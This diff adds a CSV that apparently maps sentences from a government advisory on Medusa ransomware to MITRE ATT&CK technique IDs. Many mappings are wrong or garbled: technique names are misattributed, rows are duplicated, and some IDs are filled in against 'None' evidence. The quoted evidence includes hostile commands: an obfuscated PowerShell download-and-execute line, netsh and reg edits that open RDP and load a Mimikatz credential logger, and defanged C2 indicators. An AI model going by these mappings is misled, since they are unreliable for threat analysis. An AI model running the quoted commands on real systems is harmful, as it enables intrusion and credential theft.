@@ -1,0 +1,119 @@
+technique_id,technique_name,evidence,chunk,valid_id,evidence_found
+T1059.001,Command and Control - Server Software,Medusa is a ransomware-as-a-service (RaaS) variant first identified in June 2021.,0,True,True
+T1059,Command and Control,Both Medusa developers and affiliates use a double-extortion model where they encrypt victim data and threaten to publicly release exfiltrated data if a ransom is not paid.,0,True,True
+T1210,Exploit Public-Facing Application,It describes Medusa’s opportunistic targeting and use of Interactsh URLs for exploit verification.,0,True,True
+T1212,Exploit Vulnerability,"The update expands details on Medusa actors’ operations, including more specifics about their affiliate model and payment ranges for initial access brokers, as well as a broader list of exploited vulnerabilities.",0,True,True
+T1059.001,Command and Control: Software Component,"also lists additional tools for network enumeration, persistence, and stealth, including detailed PowerShell obfuscation techniques and command-and-control utilities.",1,True,True
+T1071,Application Layer Protocol: Web Service,"also lists additional tools for network enumeration, persistence, and stealth, including detailed PowerShell obfuscation techniques and command-and-control utilities.",1,True,True
+T1071.001,Web Shell,"also lists additional tools for network enumeration, persistence, and stealth, including detailed PowerShell obfuscation techniques and command-and-control utilities.",1,True,True
+T1082,System Information Discovery,"also lists additional tools for network enumeration, persistence, and stealth, including detailed PowerShell obfuscation techniques and command-and-control utilities.",1,True,True
+T1083,System Owner/User Discovery,"also lists additional tools for network enumeration, persistence, and stealth, including detailed PowerShell obfuscation techniques and command-and-control utilities.",1,True,True
+T1084,System Network Configuration Discovery,"also lists additional tools for network enumeration, persistence, and stealth, including detailed PowerShell obfuscation techniques and command-and-control utilities.",1,False,True
+T1085,Process Discovery,"also lists additional tools for network enumeration, persistence, and stealth, including detailed PowerShell obfuscation techniques and command-and-control utilities.",1,False,True
+T1087,Network Service Discovery,"also lists additional tools for network enumeration, persistence, and stealth, including detailed PowerShell obfuscation techniques and command-and-control utilities.",1,True,True
+T1089,System Service Discovery,"also lists additional tools for network enumeration, persistence, and stealth, including detailed PowerShell obfuscation techniques and command-and-control utilities.",1,False,True
+T1090,Remote Services,"also lists additional tools for network enumeration, persistence, and stealth, including detailed PowerShell obfuscation techniques and command-and-control utilities.",1,True,True
+T1092,Acquire Infrastructure,"also lists additional tools for network enumeration, persistence, and stealth, including detailed PowerShell obfuscation techniques and command-and-control utilities.",1,True,True
+T1093,Hidden Covert Channel,"also lists additional tools for network enumeration, persistence, and stealth, including detailed PowerShell obfuscation techniques and command-and-control utilities.",1,False,True
+T1059.001,Command and Control - Custom Command and Control Protocol,Medusa actors have impacted over 500 victims from a variety of critical infrastructure sectors.,2,True,False
+T1059,Command and Control,Medusa actors have impacted over 500 victims from a variety of critical infrastructure sectors.,2,True,False
+T1204,User Execution,Medusa is a ransomware-as-a-service (RaaS) variant first identified in June 2021.,2,True,True
+T1486,Data Encrypted for Impact,Medusa actors have impacted over 500 victims from a variety of critical infrastructure sectors.,2,True,False
+T1486.001,Data Encrypted for Impact - Ransomware,Medusa actors have impacted over 500 victims from a variety of critical infrastructure sectors.,2,False,False
+T1566,Credential Dumping,Medusa actors have impacted over 500 victims from a variety of critical infrastructure sectors.,2,True,False
+T1566.002,Credential Dumping - Local Account,Medusa actors have impacted over 500 victims from a variety of critical infrastructure sectors.,2,True,False
+T1566.002,Credential Dumping - Local Account,Medusa actors have impacted over 500 victims from a variety of critical infrastructure sectors.,2,True,False
+T1566.002,Credential Dumping - Local Account,Medusa actors have impacted over 500 victims from a variety of critical infrastructure sectors.,2,True,False
+T1566.002,Credential Dumping - Local Account,Medusa actors have impacted over 500 victims from a variety of critical infrastructure sectors.,2,True,False
+T1566.002,Credential Dumping - Local Account,Medusa actors have impacted over 500 victims from a variety of critical infrastructure sectors.,2,True,False
+T1566.002,Credential Dumping - Local Account,Medusa actors have impacted over 500 victims from a variety of critical infrastructure sectors.,2,True,False
+T1059.001,Command and Control Server,Medusa actors use a double-extortion model where they encrypt victim data and threaten to publicly release exfiltrated data if a ransom is not paid.,3,True,True
+T1056,Input Validation,exploitation of unpatched software vulnerabilities through Common Vulnerabilities and Exposures (CVEs) such as: o ScreenConnect vulnerability CVE-2024-1709 [CWE-288: Authentication Bypass Using an Alternate Path or Channel].,3,True,True
+T1056.001,SQL Injection,exploitation of unpatched software vulnerabilities through Common Vulnerabilities and Exposures (CVEs) such as: o Fortinet EMS SQL injection vulnerability CVE-2023-48788 [CWE 89: SQL Injection].,3,True,False
+T1056.002,Deserialization of Untrusted Data,"exploitation of unpatched software vulnerabilities through Common Vulnerabilities and Exposures (CVEs) such as: o (Updated, Aug. 18, 2026) Fortra GoAnywhere vulnerability CVE-2025-10035 [CWE-502: Deserialization of Untrusted Data].",3,True,False
+T1056.003,OS Command Injection,"exploitation of unpatched software vulnerabilities through Common Vulnerabilities and Exposures (CVEs) such as: o (Updated, Aug. 18, 2026) BeyondTrust vulnerability CVE-2026-1731 [CWE-78: OS Command Injection].",3,True,False
+T1046,Network Service Scanning,"Medusa actors leverage vulnerability announcements, such as the February 2026 publication of BeyondTrust vulnerability CVE- 2026-1731, to identify CVEs to exploit.",3,True,True
+T1566,Phishing,Phishing campaigns as a primary method for stealing victim credentials.,3,True,False
+T1210,Exploit Public-Facing Application,Medusa actors operate opportunistically by targeting victims with unpatched software rather than focusing on specific organizations or sectors;,3,True,True
+T1059.001,Command and Control Server Infrastructure,Medusa actors make use of Interactsh dynamic URLs to verify successful exploitation.,4,True,True
+T1047,Windows Management Instrumentation,Medusa actors use Windows Management Instrumentation (WMI) for querying system information.,4,True,True
+T1055,Process Injection,Medusa actors use Minidump (comsvcs.dll) to avoid detection when dumping Local Security Authority Subsystem Service (LSASS) credentials.,4,True,False
+T1053,Scheduled Task/Job,None,4,True,False
+T1059,Command and Control,Medusa actors use PowerShell and the Windows Command Prompt (cmd.exe) for network and filesystem enumeration and to utilize Ingress Tool Transfer capabilities.,4,True,False
+T1046,System Network Configuration Discovery,"Medusa actors use living off the land (LOTL) techniques and legitimate tools, such as Advanced IP Scanner and SoftPerfect Network Scanner for initial user, system, and network enumeration.",4,True,True
+T1040,Network Service Scanning,"Once a foothold in a victim network is established, commonly scanned ports include:  21 (FTP) TLP:CLEAR CISA | FBI | HHS Page 7 of 29 | Product ID: AA25-071A TLP:CLEAR  22 (SSH)  23 (Telnet)  80 (HTTP)  115 (SFTP)  443 (HTTPS)  1433 (SQL database)  3050 (Firebird database)  3128 (HTTP web  ",4,True,True
+T1052,Input Capture,None,4,True,False
+T1056,API Monitoring,None,4,True,False
+T1057,Boot or System Services,None,4,True,False
+T1058,Application Shimming,None,4,False,False
+T1059.002,Scheduled Task/Job,None,4,True,False
+T1059.001,Command and Control: Standard Command and Control Protocol,powershell -exec bypass -enc <base64 encrypted command string>,5,True,True
+T1059.002,Command and Control: Data Encrypted/Hidden,powershell -nop -c $x = 'D' + 'Own' + 'LOa' + 'DfI' + 'le'; Invoke-Expression (New-Object Net.WebClient).$x.Invoke(http://<ip>/<RAS tool>.msi),5,True,False
+T1059.003,Command and Control: Data Encrypted/Hidden,The base64 payload is split using empty strings and concatenation and uses a format operator (-f) followed by three arguments to specify character replacements in the base64 payload.,5,True,True
+T1059.003,Command and Control: Data Encrypted/Hidden,"The obfuscated base64 PowerShell payload is identical to powerfun.ps1, a publicly available stager script that can create either a reverse or bind shell over Transport Layer Security (TLS) to load additional modules.",5,True,True
+T1059.003,Command and Control: Data Encrypted/Hidden,The base64 payload is split using empty strings and concatenation and uses a format operator (-f) followed by three arguments to specify character replacements in the base64 payload.,5,True,True
+T1059.003,Command and Control: Data Encrypted/Hidden,"The obfuscated base64 PowerShell payload is identical to powerfun.ps1, a publicly available stager script that can create either a reverse or bind shell over Transport Layer Security (TLS) to load additional modules.",5,True,True
+T1059.003,Command and Control: Data Encrypted/Hidden,The base64 payload is split using empty strings and concatenation and uses a format operator (-f) followed by three arguments to specify character replacements in the base64 payload.,5,True,True
+T1059.003,Command and Control: Data Encrypted/Hidden,"The obfuscated base64 PowerShell payload is identical to powerfun.ps1, a publicly available stager script that can create either a reverse or bind shell over Transport Layer Security (TLS) to load additional modules.",5,True,True
+T1059.003,Command and Control: Data Encrypted/Hidden,The base64 payload is split using empty strings and concatenation and uses a format operator (-f) followed by three arguments to specify character replacements in the base64 payload.,5,True,True
+T1059.003,Command and Control: Data Encrypted/Hidden,"The obfuscated base64 PowerShell payload is identical to powerfun.ps1, a publicly available stager script that can create either a reverse or bind shell over Transport Layer Security (TLS) to load additional modules.",5,True,True
+T1059.003,Command and Control: Data Encrypted/Hidden,The base64 payload is split using empty strings and concatenation and uses a format operator (-f) followed by three arguments to specify character replacements in the base64 payload.,5,True,True
+T1059.003,Command and Control: Data Encrypted/Hidden,"The obfuscated base64 PowerShell payload is identical to powerfun.ps1, a publicly available stager script that can create either a reverse or bind shell over Transport Layer Security (TLS) to load additional modules.",5,True,True
+T1059.001,Command and Control: Standard Command and Control Protocol,An operations and maintenance server monitoring tool used to allow backdoor visibility to compromised hosts from the threat actor’s machine.,6,True,True
+T1059.002,Command and Control: Data Encrypted/Protected,"MeshAgent, the MeshCentral endpoint agent, connects remote devices to allow threat actors to remotely manage the machine.",6,True,True
+T1059.003,Command and Control: Valid Accounts,"MeshAgent, the MeshCentral endpoint agent, connects remote devices to allow threat actors to remotely manage the machine.",6,True,True
+T1059.004,Command and Control: Valid Accounts,"MeshAgent, the MeshCentral endpoint agent, connects remote devices to allow threat actors to remotely manage the machine.",6,True,True
+T1059.005,Command and Control: Valid Accounts,"MeshAgent, the MeshCentral endpoint agent, connects remote devices to allow threat actors to remotely manage the machine.",6,True,True
+T1059.006,Command and Control: Valid Accounts,"MeshAgent, the MeshCentral endpoint agent, connects remote devices to allow threat actors to remotely manage the machine.",6,True,True
+T1059.007,Command and Control: Valid Accounts,"MeshAgent, the MeshCentral endpoint agent, connects remote devices to allow threat actors to remotely manage the machine.",6,True,True
+T1059.008,Command and Control: Valid Accounts,"MeshAgent, the MeshCentral endpoint agent, connects remote devices to allow threat actors to remotely manage the machine.",6,True,True
+T1059.009,Command and Control: Valid Accounts,"MeshAgent, the MeshCentral endpoint agent, connects remote devices to allow threat actors to remotely manage the machine.",6,True,True
+T1059.010,Command and Control: Valid Accounts,"MeshAgent, the MeshCentral endpoint agent, connects remote devices to allow threat actors to remotely manage the machine.",6,True,True
+T1059.011,Command and Control: Valid Accounts,"MeshAgent, the MeshCentral endpoint agent, connects remote devices to allow threat actors to remotely manage the machine.",6,True,True
+T1059.012,Command and Control: Valid Accounts,"MeshAgent, the MeshCentral endpoint agent, connects remote devices to allow threat actors to remotely manage the machine.",6,True,True
+T1059.001,Command and Control: Standard Command and Control,commands using cmd /c,7,True,True
+T1059.002,Command and Control: Standard Command and Control,One of the batch scripts executed by PsExec is openrdp.bat,7,True,True
+T1059.003,Command and Control: Standard Command and Control,"netsh advfirewall firewall add rule name=""rdp"" dir=in protocol=tcp localport=3389 action=allow",7,True,True
+T1059.003,Command and Control: Standard Command and Control,"netsh advfirewall firewall set rule group=""windows management instrumentation (wmi)"" new enable=yes",7,True,True
+T1059.003,Command and Control: Standard Command and Control,"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",7,True,True
+T1059.003,Command and Control: Standard Command and Control,"reg add hklm\system\currentcontrolset\control\lsa\ /v ""Security Packages"" /d ""Kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0mimilib"" /t REG_MULTI_SZ /f",7,True,False
+T1059.003,Command and Control: Standard Command and Control,vssadmin command,7,True,True
+T1059.003,Command and Control: Standard Command and Control,"reg add hklm\system\currentcontrolset\control\lsa\ /v ""Security Packages"" /d ""Kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0mimilib"" /t REG_MULTI_SZ /f",7,True,False
+T1059.003,Command and Control: Standard Command and Control,"reg add hklm\system\currentcontrolset\control\lsa\ /v ""Security Packages"" /d ""Kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0mimilib"" /t REG_MULTI_SZ /f",7,True,False
+T1059.003,Command and Control: Standard Command and Control,"reg add hklm\system\currentcontrolset\control\lsa\ /v ""Security Packages"" /d ""Kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0mimilib"" /t REG_MULTI_SZ /f",7,True,False
+T1059.003,Command and Control: Standard Command and Control,"reg add hklm\system\currentcontrolset\control\lsa\ /v ""Security Packages"" /d ""Kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0mimilib"" /t REG_MULTI_SZ /f",7,True,False
+T1059.003,Command and Control: Standard Command and Control,"reg add hklm\system\currentcontrolset\control\lsa\ /v ""Security Packages"" /d ""Kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0mimilib"" /t REG_MULTI_SZ /f",7,True,False
+T1059.001,Command and Control: Exfiltration Structure,Medusa actors install and use Bandizip to create archives of exfiltration files and Rclone to facilitate exfiltration of data to the Medusa C2 servers.,8,True,False
+T1059.002,Command and Control: Exfiltration,"Medusa actors exfiltrate small batches of files—for example, credential files or registry hives—using rdpclip.exe, RDP’s built-in file transfer mechanism.",8,True,True
+T1072,Lateral Movement: Remote Services,"The actors use Sysinternals PsExec, PDQ Inventory/Deploy, or BigFix [T 1072] to deploy the encryptor, gaze.exe, on files across the network—with the actors disabling Windows Defender and other antivirus services on specific targets.",8,True,True
+T1056,Command and Control: Standard Application Layer Protocol,"The actors do not use PDQ Deploy for Linux environments. Instead, they use Secure File Transfer Protocol (SFTP) to transfer the encryptor, gaze.py, to the targeted machines.",8,True,True
+T1056.001,Command and Control: Standard Application Layer Protocol - S,"The actors do not use PDQ Deploy for Linux environments. Instead, they use Secure File Transfer Protocol (SFTP) to transfer the encryptor, gaze.py, to the targeted machines.",8,True,True
+T1056.002,Command and Control: Standard Application Layer Protocol - P,"The actors do not use PDQ Deploy for Linux environments. Instead, they use Secure File Transfer Protocol (SFTP) to transfer the encryptor, gaze.py, to the targeted machines.",8,True,True
+T1056.003,Command and Control: Standard Application Layer Protocol - C,"The actors do not use PDQ Deploy for Linux environments. Instead, they use Secure File Transfer Protocol (SFTP) to transfer the encryptor, gaze.py, to the targeted machines.",8,True,True
+T1056.004,Command and Control: Standard Application Layer Protocol - S,"The actors do not use PDQ Deploy for Linux environments. Instead, they use Secure File Transfer Protocol (SFTP) to transfer the encryptor, gaze.py, to the targeted machines.",8,True,True
+T1056.005,Command and Control: Standard Application Layer Protocol - P,"The actors do not use PDQ Deploy for Linux environments. Instead, they use Secure File Transfer Protocol (SFTP) to transfer the encryptor, gaze.py, to the targeted machines.",8,False,True
+T1056.006,Command and Control: Standard Application Layer Protocol - C,"The actors do not use PDQ Deploy for Linux environments. Instead, they use Secure File Transfer Protocol (SFTP) to transfer the encryptor, gaze.py, to the targeted machines.",8,False,True
+T1056.007,Command and Control: Standard Application Layer Protocol - S,"The actors do not use PDQ Deploy for Linux environments. Instead, they use Secure File Transfer Protocol (SFTP) to transfer the encryptor, gaze.py, to the targeted machines.",8,False,True
+T1056.008,Command and Control: Standard Application Layer Protocol - P,"The actors do not use PDQ Deploy for Linux environments. Instead, they use Secure File Transfer Protocol (SFTP) to transfer the encryptor, gaze.py, to the targeted machines.",8,False,True
+T1059.001,Command and Control - Server Software,Medusa actors operate a .onion data leak site,9,True,False
+T1059.002,Command and Control - Other Malicious Software,Medusa actors post ransom demands on the leak site with direct hyperlinks to Medusa-affiliated cryptocurrency wallets,9,True,True
+T1059.003,Command and Control - Other,Medusa actors use the threat of posting victims as negotiation leverage,9,True,True
+T1059.004,Command and Control - Other,"Medusa actors offer a “lower rate” for quick payments, stating that discounts will expire after an arbitrary amount of time",9,True,True
+T1059.005,Command and Control - Other,Medusa actors research victim financial details and base their demands on publicly posted revenue,9,True,True
+T1059.006,Command and Control - Other,Medusa actors claim to remove the victim’s information from the site,9,True,True
+T1059.007,Command and Control - Other,Medusa actors concurrently advertise sale of the data to interested parties before the countdown timer ends,9,True,False
+T1059.008,Command and Control - Other,"Victims can pay $10,000 USD in cryptocurrency to add a day to the countdown timer",9,True,True
+T1059.009,Command and Control - Other,Medusa actors generally request payment in Bitcoin but may demand payment in other cryptocurrencies,9,True,True
+T1059.010,Command and Control - Other,"FBI investigations identified that after paying the ransom, one victim was contacted by a separate Medusa actor who claimed the negotiator had stolen the ransom amount already paid and requested half of the payment be made again",9,True,True
+T1059.001,Command and Control (C2) Server,https://3324.reques tcatcher[.]com/hihi,10,True,True
+T1047,Web Shell,http//45.61.150[.]9 4:8000/storm[.]exe,10,True,True
+T1056,Input Capture,mimilib.dll eb05429d25fc57b476428cdb0a134b2f Mimikatz password logger,10,True,True
+T1056,Input Capture,command.cmd 04b13b6cd5e5291b1cde78975a140feea 7fd3bc3777c53caa1ab33426c83bfcc PDQ Deploy script to run gaze.exe,10,True,True
+T1056,Input Capture,openrdp.bat 44370f5c977e415981febf7dbb87a85c Allows incoming RDP and remote WMI connections,10,True,True
+T1056,Input Capture,Ngconf.txt 8f11d9067da087cb4185fa804caac2df RClone configuration file,10,True,True
+T1056,Input Capture,Main_new.exe 2df705c9be0465f1c73a9f5d35147723deb16b5e SimpleHelp executable,10,True,True
+T1059.002,Domain Name System (DNS) Tunneling,IP Address & URL Exfiltration IP/domain 185.238.231[.]16,10,True,True
+T1059.002,Domain Name System (DNS) Tunneling,IP Address & URL Exfiltration IP/domain 185.238.231[.]98,10,True,False
+T1059.002,Domain Name System (DNS) Tunneling,IP Address & URL Exfiltration IP/domain 185.238.231[.]77,10,True,False
+T1059.002,Domain Name System (DNS) Tunneling,IP Address & URL Exfiltration IP/domain 185.238.231[.]85,10,True,False
+T1059.002,Domain Name System (DNS) Tunneling,IP Address & URL Exfiltration IP/domain 185.238.231[.]4,10,True,False
